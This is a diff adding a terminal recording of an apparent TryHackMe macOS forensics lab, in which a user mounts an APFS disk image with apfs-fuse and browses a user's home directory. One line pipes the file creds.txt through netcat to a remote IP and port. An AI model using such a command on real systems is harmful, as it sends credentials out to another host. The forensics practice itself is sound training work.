@@ -1,0 +1,290 @@
+Script started on 2025-04-02 20:11:57+03:00 [COMMAND="ssh -i ubuntu.key ubuntu@macos.forensics.basics.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+The authenticity of host 'macos.forensics.basics.thm (10.10.172.218)' can't be established.
+ED25519 key fingerprint is SHA256:miG8R1Yv9MAzsSxdb/fyYXdQrdZIUr9PloT74zTrnGE.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:135: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'macos.forensics.basics.thm' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1021-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Apr  2 17:12:03 UTC 2025
+
+  System load:  0.1                Temperature:           -273.1 C
+  Usage of /:   62.4% of 58.09GB   Processes:             205
+  Memory usage: 53%                Users logged in:       0
+  Swap usage:   31%                IPv4 address for ens5: 10.10.172.218
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+164 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+10 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Mar 28 20:43:37 2025 from 10.11.86.7
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ ls
+[?2004l[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  [01;34mVideos[0m  [01;34mmac[0m  [01;32mmac-disk.img[0m  [01;34msnap[0m
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ [7mapfsutil mac-disk.img[27mapfsutil mac-disk.img
+[?2004lFound partitions:
+69646961-6700-11AA-11AA-00306543ECAC 68CB0FFE-F676-47D6-D1A2-5707D06D3E49 0000000000000028 00000000000FA027 0000000000000000 iBootSystemContainer
+7C3457EF-0000-11AA-11AA-00306543ECAC 449DFC0C-7E1F-44D5-6A9F-7EA2C2AF0ADC 00000000000FA028 0000000002800027 0000000000000000 Container
+52637672-7900-11AA-11AA-00306543ECAC A9432466-4751-47B7-1BBC-45B7B70465DE 0000000002800028 00000000031FFFD7 0000000000000000 RecoveryOSContainer
+First APFS partition is 1
+
+Volume 0 3B2E79F0-E4D4-4017-8443-597659F89844
+---------------------------------------------
+Role:               System
+Name:               Macintosh HD (Case-insensitive)
+Capacity Consumed:  10741764096 Bytes
+FileVault:          No
+Snapshots:
+    40 : 'com.apple.os.update-151731D20D0972F39B434E2361ADB6B6BDD545C4F7D1DA7F6A031731952B6956'
+
+Volume 1 01B18AFB-06F7-488D-AD2D-7BBA4F662516
+---------------------------------------------
+Role:               Preboot
+Name:               Preboot (Case-insensitive)
+Capacity Consumed:  5790040064 Bytes
+FileVault:          No
+Snapshots:
+
+Volume 2 EB33FEA7-EE13-4296-AC6E-7B52B24C9A55
+---------------------------------------------
+Role:               Recovery
+Name:               Recovery (Case-insensitive)
+Capacity Consumed:  935395328 Bytes
+FileVault:          No
+Snapshots:
+
+Volume 3 37074D60-A2AC-441E-B273-E6C504C58618
+---------------------------------------------
+Role:               Update
+Name:               Update (Case-insensitive)
+Capacity Consumed:  229376 Bytes
+FileVault:          No
+Snapshots:
+
+Volume 4 84E5F2BD-503F-4E3A-8105-EEBEBC1925B4
+---------------------------------------------
+Role:               Data
+Name:               Data (Case-insensitive)
+Capacity Consumed:  2114285568 Bytes
+FileVault:          No
+Snapshots:
+
+Volume 5 93123E81-F23A-48C5-91BF-0E227E15EE6B
+---------------------------------------------
+Role:               VM
+Name:               VM (Case-insensitive)
+Capacity Consumed:  20480 Bytes
+FileVault:          No
+Snapshots:
+
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ [7msudo su[27msudo su
+[?2004l[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# [7mapfs-fuse[27mapfs-fuse
+[?2004lapfs-fuse [options] <device> <dir>
+
+Options:
+-d level      : Enable debug output in the console.
+-f device     : Specify secondary device for fusion drives.
+-o options    : Additional mount options (see below).
+-v volume-id  : Specify number of volume to be mounted.
+-r passphrase : Specify volume passphrase. The driver will ask for it if it is
+                needed and hasn't been specified here.
+-s offset     : Specify offset to the beginning of the container.
+-p partition  : Specify partition id containing the container.
+-l            : Allow driver to return potentially corrupt data instead of
+                failing, if it can't handle something.
+
+Additional mount options (using -o):
+uid=N         : Pretend that all files have UID N.
+gid=N         : Pretend that all files have GID N.
+vol=N         : Same as -v, select volume id to mount.
+blksize=N     : Set physical block size. Only needed if a partition table needs
+                to be parsed and the sector size is not 512 bytes.
+pass=...      : Specify volume passphrase (same as -r).
+xid=N         : Mount specific xid.
+snap=N        : Mount snapshot with given id. Use apfsutil for getting the ids.
+
+[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# [7mapfs-fuse mac-disk.img mac/[27mapfs-fuse mac-disk.img mac/
+[?2004l[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# ls
+[?2004l[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  [01;34mVideos[0m  [01;34mmac[0m  [01;32mmac-disk.img[0m  [01;34msnap[0m
+[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# cd mac
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/macroot@tryhackme:/home/ubuntu/mac# ls
+[?2004l[0m[01;34mprivate-dir[0m  [01;34mroot[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/macroot@tryhackme:/home/ubuntu/mac# cd root
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls
+[?2004l[0m[01;34mApplications[0m  [01;34mLibrary[0m  [01;34mSystem[0m  [01;34mUsers[0m  [01;34mVolumes[0m  [01;34mbin[0m  [01;34mcores[0m  [01;34mdev[0m  [40;31;01metc[0m  [01;34mopt[0m  [01;34mprivate[0m  [01;34msbin[0m  [40;31;01mtmp[0m  [01;34musr[0m  [40;31;01mvar[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd ../..
+[?2004l[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# [7mapfs-fuse -v 4 mac-disk.img mac[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Capfs-fuse -v 4 mac-disk.img mac
+[?2004l[?2004h]0;root@tryhackme: /home/ubunturoot@tryhackme:/home/ubuntu# cd[K[Kcd mac
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/macroot@tryhackme:/home/ubuntu/mac# ls
+[?2004l[0m[01;34mprivate-dir[0m  [01;34mroot[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/macroot@tryhackme:/home/ubuntu/mac# cd root
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls
+[?2004l[0m[01;34mApplications[0m  [01;34mMobileSoftwareUpdate[0m  [01;34mUsers[0m    [01;34mcores[0m  [01;34mmnt[0m  [01;34mprivate[0m  [01;34musr[0m
+[01;34mLibrary[0m       [01;34mSystem[0m                [01;34mVolumes[0m  [01;34mhome[0m   [01;34mopt[0m  [01;34msw[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd Users
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# ls
+[?2004l[0m[30;42mShared[0m  [01;34mthm[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# cd thm
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# l
+[?2004l[0m[01;34mDesktop[0m/  [01;34mDocuments[0m/  [01;34mDownloads[0m/  [01;34mLibrary[0m/  [01;34mMovies[0m/  [01;34mMusic[0m/  [01;34mPictures[0m/  [01;34mPublic[0m/  creds.txt
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# s[Kwhich dd
+[?2004l/usr/bin/dd
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# dd of[K[Kif=[7mcreds.txt[27mcreds.txt stau[Ktus=progress | nc 10.8.61.245 4444
+[?2004l0+1 records in
+0+1 records out
+28 bytes copied, 0.106345 s, 0.3 kB/s
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# cd Desktoi[Kp
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thm/Desktoproot@tryhackme:/home/ubuntu/mac/root/Users/thm/Desktop# ls
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thm/Desktoproot@tryhackme:/home/ubuntu/mac/root/Users/thm/Desktop# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# 
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# ls -al
+[?2004ltotal 0
+-r-------- 1 501 dialout   7 Dec  8 17:27 .CFUserTextEncoding
+drwx------ 1 501 dialout   0 Dec  8 17:42 [0m[01;34m.Trash[0m
+-rw------- 1 501 dialout 798 Jan 19 15:52 .viminfo
+-rw------- 1 501 dialout  14 Jan 19 15:52 .zsh_history
+drwx------ 1 501 dialout   5 Jan 19 15:52 [01;34m.zsh_sessions[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDesktop[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDocuments[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDownloads[0m
+drwx------ 1 501 dialout  74 Jan 19 15:12 [01;34mLibrary[0m
+drwx------ 1 501 dialout   2 Dec  8 17:31 [01;34mMovies[0m
+drwx------ 1 501 dialout   2 Dec  8 17:29 [01;34mMusic[0m
+drwx------ 1 501 dialout   2 Dec  8 17:27 [01;34mPictures[0m
+drwxr-xr-x 1 501 dialout   2 Dec  8 17:27 [01;34mPublic[0m
+-rw-r--r-- 1 501 dialout  28 Jan 19 15:52 creds.txt
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# ls -al
+[?2004ltotal 0
+-rw-r--r-- 1   99      99 6148 Jan 19 16:03 .DS_Store
+-rw-r--r-- 1 root root       0 Nov 15 04:59 .localized
+drwxrwxrwt 1 root root       2 Dec  8 17:30 [0m[30;42mShared[0m
+drwxr-x--- 1  501 dialout   14 Jan 19 15:52 [01;34mthm[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls
+[?2004l[0m[01;34mApplications[0m  [01;34mMobileSoftwareUpdate[0m  [01;34mUsers[0m    [01;34mcores[0m  [01;34mmnt[0m  [01;34mprivate[0m  [01;34musr[0m
+[01;34mLibrary[0m       [01;34mSystem[0m                [01;34mVolumes[0m  [01;34mhome[0m   [01;34mopt[0m  [01;34msw[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd Applications/
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applicationsroot@tryhackme:/home/ubuntu/mac/root/Applications# ls
+[?2004l[0m[40;31;01mSafari.app[0m  [01;34mUtilities[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applicationsroot@tryhackme:/home/ubuntu/mac/root/Applications# cat Safari.app 
+[?2004lcat: Safari.app: No such file or directory
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applicationsroot@tryhackme:/home/ubuntu/mac/root/Applications# cd Utilities/
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applications/Utilitiesroot@tryhackme:/home/ubuntu/mac/root/Applications/Utilities# ls
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applications/Utilitiesroot@tryhackme:/home/ubuntu/mac/root/Applications/Utilities# ls -al
+[?2004ltotal 0
+-rw-r--r-- 1 root root 0 Nov 15 04:59 .localized
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applications/Utilitiesroot@tryhackme:/home/ubuntu/mac/root/Applications/Utilities# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Applicationsroot@tryhackme:/home/ubuntu/mac/root/Applications# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls
+[?2004l[0m[01;34mApplications[0m  [01;34mMobileSoftwareUpdate[0m  [01;34mUsers[0m    [01;34mcores[0m  [01;34mmnt[0m  [01;34mprivate[0m  [01;34musr[0m
+[01;34mLibrary[0m       [01;34mSystem[0m                [01;34mVolumes[0m  [01;34mhome[0m   [01;34mopt[0m  [01;34msw[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls -al
+[?2004ltotal 0
+drwx------ 1 root root  2 Dec  8 17:25 [0m[01;34m.Spotlight-V100[0m
+drwxr-xr-t 1 root root  0 Nov 15 04:59 [37;44m.TemporaryItems[0m
+drwx------ 1 root root 17 Jan 19 16:03 [01;34m.fseventsd[0m
+drwxrwxr-x 1 root   80  3 Nov 15 06:13 [01;34mApplications[0m
+drwxr-xr-x 1 root root 62 Dec  8 17:27 [01;34mLibrary[0m
+drwxr-xr-x 1 root root  1 Dec  8 17:25 [01;34mMobileSoftwareUpdate[0m
+drwxr-xr-x 1 root root  1 Nov 15 06:13 [01;34mSystem[0m
+drwxr-xr-x 1 root   80  4 Jan 19 16:03 [01;34mUsers[0m
+drwxr-xr-x 1 root root  1 Jan 19 15:47 [01;34mVolumes[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mcores[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mhome[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mmnt[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mopt[0m
+drwxr-xr-x 1 root root  4 Jan 19 15:47 [01;34mprivate[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34msw[0m
+drwxr-xr-x 1 root root  3 Nov 15 06:14 [01;34musr[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd Volumes
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Volumesroot@tryhackme:/home/ubuntu/mac/root/Volumes# ls -al
+[?2004ltotal 0
+lrwxr-xr-x 1 root root 0 Jan 19 15:47 [0m[01;36m'Macintosh HD'[0m -> [01;34m/[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Volumesroot@tryhackme:/home/ubuntu/mac/root/Volumes# cd home
+[?2004lbash: cd: home: No such file or directory
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Volumesroot@tryhackme:/home/ubuntu/mac/root/Volumes# ls -al
+[?2004ltotal 0
+lrwxr-xr-x 1 root root 0 Jan 19 15:47 [0m[01;36m'Macintosh HD'[0m -> [01;34m/[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Volumesroot@tryhackme:/home/ubuntu/mac/root/Volumes# ls
+[?2004l[0m[01;36m'Macintosh HD'[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Volumesroot@tryhackme:/home/ubuntu/mac/root/Volumes# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls 
+[?2004l[0m[01;34mApplications[0m  [01;34mMobileSoftwareUpdate[0m  [01;34mUsers[0m    [01;34mcores[0m  [01;34mmnt[0m  [01;34mprivate[0m  [01;34musr[0m
+[01;34mLibrary[0m       [01;34mSystem[0m                [01;34mVolumes[0m  [01;34mhome[0m   [01;34mopt[0m  [01;34msw[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd home
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/homeroot@tryhackme:/home/ubuntu/mac/root/home# ls -al
+[?2004ltotal 0
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/homeroot@tryhackme:/home/ubuntu/mac/root/home# cd ..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls -al
+[?2004ltotal 0
+drwx------ 1 root root  2 Dec  8 17:25 [0m[01;34m.Spotlight-V100[0m
+drwxr-xr-t 1 root root  0 Nov 15 04:59 [37;44m.TemporaryItems[0m
+drwx------ 1 root root 17 Jan 19 16:03 [01;34m.fseventsd[0m
+drwxrwxr-x 1 root   80  3 Nov 15 06:13 [01;34mApplications[0m
+drwxr-xr-x 1 root root 62 Dec  8 17:27 [01;34mLibrary[0m
+drwxr-xr-x 1 root root  1 Dec  8 17:25 [01;34mMobileSoftwareUpdate[0m
+drwxr-xr-x 1 root root  1 Nov 15 06:13 [01;34mSystem[0m
+drwxr-xr-x 1 root   80  4 Jan 19 16:03 [01;34mUsers[0m
+drwxr-xr-x 1 root root  1 Jan 19 15:47 [01;34mVolumes[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mcores[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mhome[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mmnt[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34mopt[0m
+drwxr-xr-x 1 root root  4 Jan 19 15:47 [01;34mprivate[0m
+drwxr-xr-x 1 root root  0 Nov 15 04:59 [01;34msw[0m
+drwxr-xr-x 1 root root  3 Nov 15 06:14 [01;34musr[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd usr
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/usrroot@tryhackme:/home/ubuntu/mac/root/usr# ls
+[?2004l[0m[01;34mlibexec[0m  [01;34mlocal[0m  [01;34mshare[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/usrroot@tryhackme:/home/ubuntu/mac/root/usr# cd local
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/usr/localroot@tryhackme:/home/ubuntu/mac/root/usr/local# ls
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/usr/localroot@tryhackme:/home/ubuntu/mac/root/usr/local# cd ../..
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# ls
+[?2004l[0m[01;34mApplications[0m  [01;34mMobileSoftwareUpdate[0m  [01;34mUsers[0m    [01;34mcores[0m  [01;34mmnt[0m  [01;34mprivate[0m  [01;34musr[0m
+[01;34mLibrary[0m       [01;34mSystem[0m                [01;34mVolumes[0m  [01;34mhome[0m   [01;34mopt[0m  [01;34msw[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/rootroot@tryhackme:/home/ubuntu/mac/root# cd Users
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# ls 
+[?2004l[0m[30;42mShared[0m  [01;34mthm[0m
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Usersroot@tryhackme:/home/ubuntu/mac/root/Users# cd thm
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# ls -al
+[?2004ltotal 0
+-r-------- 1 501 dialout   7 Dec  8 17:27 .CFUserTextEncoding
+drwx------ 1 501 dialout   0 Dec  8 17:42 [0m[01;34m.Trash[0m
+-rw------- 1 501 dialout 798 Jan 19 15:52 .viminfo
+-rw------- 1 501 dialout  14 Jan 19 15:52 .zsh_history
+drwx------ 1 501 dialout   5 Jan 19 15:52 [01;34m.zsh_sessions[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDesktop[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDocuments[0m
+drwx------ 1 501 dialout   1 Dec  8 17:27 [01;34mDownloads[0m
+drwx------ 1 501 dialout  74 Jan 19 15:12 [01;34mLibrary[0m
+drwx------ 1 501 dialout   2 Dec  8 17:31 [01;34mMovies[0m
+drwx------ 1 501 dialout   2 Dec  8 17:29 [01;34mMusic[0m
+drwx------ 1 501 dialout   2 Dec  8 17:27 [01;34mPictures[0m
+drwxr-xr-x 1 501 dialout   2 Dec  8 17:27 [01;34mPublic[0m
+-rw-r--r-- 1 501 dialout  28 Jan 19 15:52 creds.txt
+[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# ls .Trash
+[?2004l[?2004h]0;root@tryhackme: /home/ubuntu/mac/root/Users/thmroot@tryhackme:/home/ubuntu/mac/root/Users/thm# exit
+[?2004lexit
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ exit
+[?2004llogout
+Connection to macos.forensics.basics.thm closed.
+
+Script done on 2025-04-02 20:19:48+03:00 [COMMAND_EXIT_CODE="0"]
